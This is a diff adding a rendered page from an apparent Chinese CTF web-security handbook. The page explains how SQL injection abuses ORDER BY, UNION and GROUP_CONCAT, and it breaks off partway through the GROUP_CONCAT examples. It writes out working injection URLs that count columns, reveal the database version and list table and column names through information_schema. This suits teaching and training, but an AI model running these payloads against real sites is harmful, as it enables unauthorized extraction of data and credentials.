@@ -1,0 +1,1207 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      
+        <link rel="prev" href="../SQL-Hackbar%20%E5%AE%89%E8%A3%85/">
+      
+      
+        <link rel="next" href="../SQL-2-information_schema%E5%88%A9%E7%94%A8/">
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.11">
+    
+    
+      
+        <title>注入中的关键词 - CTF-Web修炼手册</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.4af4bdda.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+Sans+SC:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Noto Sans SC";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="white" data-md-color-accent="deep-purple">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#1-order-by" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href=".." title="CTF-Web修炼手册" class="md-header__button md-logo" aria-label="CTF-Web修炼手册" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m10 17-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9m-6-8L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            CTF-Web修炼手册
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              注入中的关键词
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="white" data-md-color-accent="deep-purple"  aria-label="切换到深色模式"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="切换到深色模式" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="deep-purple" data-md-color-accent="indigo"  aria-label="切换到浅色模式"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="切换到浅色模式" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href=".." class="md-tabs__link">
+        
+  
+  
+    
+  
+  开始
+
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../SQL-Hackbar%20%E5%AE%89%E8%A3%85/" class="md-tabs__link">
+          
+  
+  
+  环境配置
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="./" class="md-tabs__link">
+          
+  
+  
+  SQL注入技巧
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href=".." title="CTF-Web修炼手册" class="md-nav__button md-logo" aria-label="CTF-Web修炼手册" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="m10 17-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9m-6-8L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5z"/></svg>
+
+    </a>
+    CTF-Web修炼手册
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href=".." class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    开始
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    环境配置
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            环境配置
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL-Hackbar%20%E5%AE%89%E8%A3%85/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SQL-Hackbar 安装
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    SQL注入技巧
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            SQL注入技巧
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    注入中的关键词
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    注入中的关键词
+    
+  </span>
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-order-by" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. ORDER BY 的作用
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="1. ORDER BY 的作用">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      示例：
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-union" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. UNION 的作用
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. UNION 的作用">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      示例：
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      进阶：获取表名和列名
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#group_concat" class="md-nav__link">
+    <span class="md-ellipsis">
+      GROUP_CONCAT 的基本用法
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="GROUP_CONCAT 的基本用法">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      示例 1：基础用法
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    <span class="md-ellipsis">
+      示例 2：使用自定义分隔符
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sql" class="md-nav__link">
+    <span class="md-ellipsis">
+      在 SQL 注入中的应用
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="在 SQL 注入中的应用">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      示例：列出表名
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      示例：列出特定表的列名
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      示例：列出敏感数据（如用户名和密码）
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3group_concat-sql" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.GROUP_CONCAT 在 SQL 注入中的优势
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#group_concat-sql" class="md-nav__link">
+    <span class="md-ellipsis">
+      如何防止使用 GROUP_CONCAT 的 SQL 注入攻击
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL-2-information_schema%E5%88%A9%E7%94%A8/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    information_schema利用
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL-3-%E6%99%AE%E9%80%9A%E6%B3%A8%E5%85%A5/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    普通注入
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL-4-bool%E7%9B%B2%E6%B3%A8%E6%80%9D%E8%B7%AF/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    bool盲注思路
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../SQL-5-bool%E7%9B%B2%E6%B3%A8%E9%80%BB%E8%BE%91%E5%8F%82%E8%80%83/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    bool盲注逻辑参考
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1-order-by" class="md-nav__link">
+    <span class="md-ellipsis">
+      1. ORDER BY 的作用
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="1. ORDER BY 的作用">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      示例：
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-union" class="md-nav__link">
+    <span class="md-ellipsis">
+      2. UNION 的作用
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="2. UNION 的作用">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_2" class="md-nav__link">
+    <span class="md-ellipsis">
+      示例：
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_3" class="md-nav__link">
+    <span class="md-ellipsis">
+      进阶：获取表名和列名
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#group_concat" class="md-nav__link">
+    <span class="md-ellipsis">
+      GROUP_CONCAT 的基本用法
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="GROUP_CONCAT 的基本用法">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1" class="md-nav__link">
+    <span class="md-ellipsis">
+      示例 1：基础用法
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2" class="md-nav__link">
+    <span class="md-ellipsis">
+      示例 2：使用自定义分隔符
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#sql" class="md-nav__link">
+    <span class="md-ellipsis">
+      在 SQL 注入中的应用
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="在 SQL 注入中的应用">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_4" class="md-nav__link">
+    <span class="md-ellipsis">
+      示例：列出表名
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" class="md-nav__link">
+    <span class="md-ellipsis">
+      示例：列出特定表的列名
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_6" class="md-nav__link">
+    <span class="md-ellipsis">
+      示例：列出敏感数据（如用户名和密码）
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3group_concat-sql" class="md-nav__link">
+    <span class="md-ellipsis">
+      3.GROUP_CONCAT 在 SQL 注入中的优势
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#group_concat-sql" class="md-nav__link">
+    <span class="md-ellipsis">
+      如何防止使用 GROUP_CONCAT 的 SQL 注入攻击
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+  <h1>注入中的关键词</h1>
+
+<p><strong><code>ORDER BY</code></strong>：主要用于测试SQL注入的漏洞，帮助攻击者确定查询返回的列数。如果列数未知，攻击者可以通过调整 <code>ORDER BY</code> 中的数字来找出正确的列数。</p>
+<p><strong><code>UNION</code></strong>：允许将多个 <code>SELECT</code> 查询的结果合并，攻击者可以使用 <code>UNION</code> 来获取数据库中的敏感信息（如表名、列名、数据库版本等）。<code>UNION</code> 查询需要返回与原查询相同数量和类型的列，因此攻击者通常会通过试探来确定合适的查询结构。</p>
+<p><strong><code>GROUP_CONCAT</code></strong> 是 MySQL 中非常强大的聚合函数，允许将多个结果行的值合并成一个字符串。在 SQL 注入攻击中，攻击者利用 <code>GROUP_CONCAT</code> 可以从数据库中提取多个表名、列名、甚至是敏感数据（如用户名和密码）。为了防止 SQL 注入，最有效的措施是使用参数化查询、严格的输入验证以及限制数据库用户权限等安全措施。</p>
+<h3 id="1-order-by">1. <strong><code>ORDER BY</code> 的作用</strong></h3>
+<p><code>ORDER BY</code> 子句用于对查询结果进行排序。通常，它接受一个列名或列的索引作为参数，并对结果进行升序或降序排序。SQL注入攻击者可以利用 <code>ORDER BY</code> 来猜测查询返回的列数，从而为后续注入操作做好准备。</p>
+<h4 id="_1">示例：</h4>
+<p>假设有一个 URL 查询参数 <code>id=1</code>，并且应用程序没有进行有效的输入验证或参数化查询。攻击者可以注入 <code>ORDER BY</code> 子句来测试返回的列数。</p>
+<p><strong>正常查询：</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>SELECT * FROM products WHERE id = 1;
+</code></pre></div>
+<p>如果攻击者注入：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>http://example.com/products?id=1&#39; ORDER BY 3 --+
+</code></pre></div>
+<p><strong>SQL查询变为：</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>SELECT * FROM products WHERE id = 1 ORDER BY 3;
+</code></pre></div>
+<ul>
+<li>如果 <code>products</code> 表有至少3列，查询将正常执行，并按第3列对结果进行排序。</li>
+<li>如果 <code>products</code> 表只有2列或更少列，查询将报错，例如：“<code>ERROR: ORDER BY position number out of range</code>”（排序位置超出范围错误）。</li>
+</ul>
+<p>通过调整 <code>ORDER BY</code> 的数字，攻击者可以逐渐确定表中的列数。例如：</p>
+<ul>
+<li><code>ORDER BY 1</code>：测试第1列是否存在。</li>
+<li><code>ORDER BY 2</code>：测试第2列是否存在。</li>
+<li><code>ORDER BY 3</code>：测试第3列是否存在。</li>
+</ul>
+<p>这个过程帮助攻击者确定数据库查询返回的列数，为后续的 <code>UNION</code> 查询做准备。</p>
+<hr />
+<h3 id="2-union">2. <strong><code>UNION</code> 的作用</strong></h3>
+<p><code>UNION</code> 是 SQL 的一个关键字，允许将两个或多个 <code>SELECT</code> 查询的结果合并成一个结果集。每个 <code>SELECT</code> 查询必须返回相同数量和类型的列。攻击者可以使用 <code>UNION</code> 来将恶意查询结果与原始查询的结果合并，进而泄露数据库中的敏感信息。</p>
+<h4 id="_2">示例：</h4>
+<p>假设一个查询返回了一张商品列表，攻击者通过注入的 <code>UNION</code> 查询尝试从数据库中获取其他信息，例如表的名称、数据库的版本等。</p>
+<p><strong>正常查询：</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>SELECT id, name, price FROM products WHERE id = 1;
+</code></pre></div>
+<p>攻击者尝试通过注入 <code>UNION</code> 来合并结果：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>http://example.com/products?id=1&#39; UNION SELECT 1,2,3 --+
+</code></pre></div>
+<p><strong>SQL查询变为：</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>SELECT id, name, price FROM products WHERE id = 1 UNION SELECT 1,2,3;
+</code></pre></div>
+<ul>
+<li>第一部分（<code>SELECT id, name, price</code>）返回正常的商品数据。</li>
+<li>第二部分（<code>SELECT 1, 2, 3</code>）返回伪造的常量值（1, 2, 3）。</li>
+</ul>
+<p>这两个查询的结果将被合并成一个结果集。如果页面在显示数据时没有进行严格的验证，它可能会同时显示商品列表和常量值。</p>
+<p><strong>注意：</strong> 这个查询之所以能成功，是因为 <code>products</code> 表的查询返回了3列，第二个 <code>UNION SELECT</code> 查询也返回了3列。如果攻击者想要从数据库中获取真实的数据（例如数据库版本或表名），他们可以将 <code>1, 2, 3</code> 替换为实际的查询，如：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>http://example.com/products?id=1&#39; UNION SELECT 1, database(), version() --+
+</code></pre></div>
+<p><strong>SQL查询变为：</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>SELECT id, name, price FROM products WHERE id = 1 UNION SELECT 1, database(), version();
+</code></pre></div>
+<ul>
+<li><code>database()</code> 返回当前数据库的名称。</li>
+<li><code>version()</code> 返回数据库的版本信息。</li>
+</ul>
+<p>如果查询成功，页面将显示商品列表以及数据库名称和版本信息。</p>
+<h4 id="_3">进阶：获取表名和列名</h4>
+<p>攻击者可以利用 <code>UNION</code> 查询获取更多敏感信息，例如数据库中的表名、列名等。</p>
+<ol>
+<li><strong>获取数据库表名：</strong></li>
+</ol>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>http://example.com/products?id=1&#39; UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema=&#39;security&#39; --+
+</code></pre></div>
+<p><strong>SQL查询变为：</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>SELECT id, name, price FROM products WHERE id = 1 UNION SELECT 1, group_concat(table_name) FROM information_schema.tables WHERE table_schema=&#39;security&#39;;
+</code></pre></div>
+<p>这个查询将返回数据库 <code>security</code> 中所有表的名称（通过 <code>group_concat</code> 将多个表名连接成一个字符串）。</p>
+<ol>
+<li><strong>获取特定表的列名：</strong></li>
+</ol>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>http://example.com/products?id=1&#39; UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_name=&#39;users&#39; --+
+</code></pre></div>
+<p><strong>SQL查询变为：</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>SELECT id, name, price FROM products WHERE id = 1 UNION SELECT 1, group_concat(column_name) FROM information_schema.columns WHERE table_name=&#39;users&#39;;
+</code></pre></div>
+<p>这个查询将返回 <code>users</code> 表的所有列名。</p>
+<h3 id="group_concat"><code>GROUP_CONCAT</code> 的基本用法</h3>
+<p>在 MySQL 中，<code>GROUP_CONCAT</code> 允许你将多个行的结果合并为一个字符串，并且可以指定分隔符。默认情况下，结果使用逗号（<code>,</code>）作为分隔符。</p>
+<h4 id="1">示例 1：基础用法</h4>
+<p>假设有一个名为 <code>users</code> 的表，包含如下数据：</p>
+<table>
+<thead>
+<tr>
+<th>id</th>
+<th>username</th>
+<th>password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>alice</td>
+<td>pass123</td>
+</tr>
+<tr>
+<td>2</td>
+<td>bob</td>
+<td>pass456</td>
+</tr>
+<tr>
+<td>3</td>
+<td>charlie</td>
+<td>pass789</td>
+</tr>
+</tbody>
+</table>
+<p>如果我们使用 <code>GROUP_CONCAT</code> 来查询所有的用户名：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>SELECT GROUP_CONCAT(username) FROM users;
+</code></pre></div>
+<p><strong>结果：</strong></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>alice,bob,charlie
+</code></pre></div>
+<p>这时，<code>GROUP_CONCAT</code> 会将 <code>username</code> 列的所有值连接成一个以逗号分隔的字符串。</p>
+<h4 id="2">示例 2：使用自定义分隔符</h4>
+<p>你也可以指定一个自定义的分隔符，例如使用破折号（<code>-</code>）作为分隔符：</p>
